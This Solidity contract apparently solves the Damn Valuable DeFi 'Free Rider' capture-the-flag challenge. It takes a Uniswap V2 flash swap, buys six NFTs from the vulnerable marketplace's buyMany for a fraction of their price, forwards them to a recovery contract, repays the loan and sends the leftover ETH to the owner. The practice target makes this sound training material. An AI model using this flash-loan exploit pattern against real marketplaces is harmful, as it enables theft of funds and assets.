// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external returns (address);
}

interface IMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

contract Attack {

    address owner;
    address nft;
    address market;
    address recovery;
    address pair;
    address weth;

    constructor(address _nft, address _market, address _recovery, address _pair, address _weth) {
        owner = msg.sender;
        nft = _nft;
        market = _market;
        recovery = _recovery;
        pair = _pair;
        weth = _weth;
    }

    function attack() public{
        require(msg.sender == owner, "Not owner");       
        IPair(pair).swap(15 ether, 0, address(this), "call");        
    }

    function uniswapV2Call(address reciever, uint256 amount0Out, uint amount1Out, bytes memory data) external{
        require(msg.sender == pair, "Not pair");
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i<ids.length; ++i) {
                ids[i] = i;
        }

        IWETH(weth).withdraw(15 ether);

        IMarket(market).buyMany{value:15 ether}(ids);
        for (uint256 i = 0; i<ids.length; ++i) {
            IERC721(nft).safeTransferFrom(address(this), recovery, i, abi.encode(address(this)));
        }

        uint256 fee = (amount0Out * 3) / 997 + 1;
        fee = amount0Out + fee;
        IWETH(weth).deposit{value: fee}();
        IERC20(weth).transfer(pair, fee);
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

}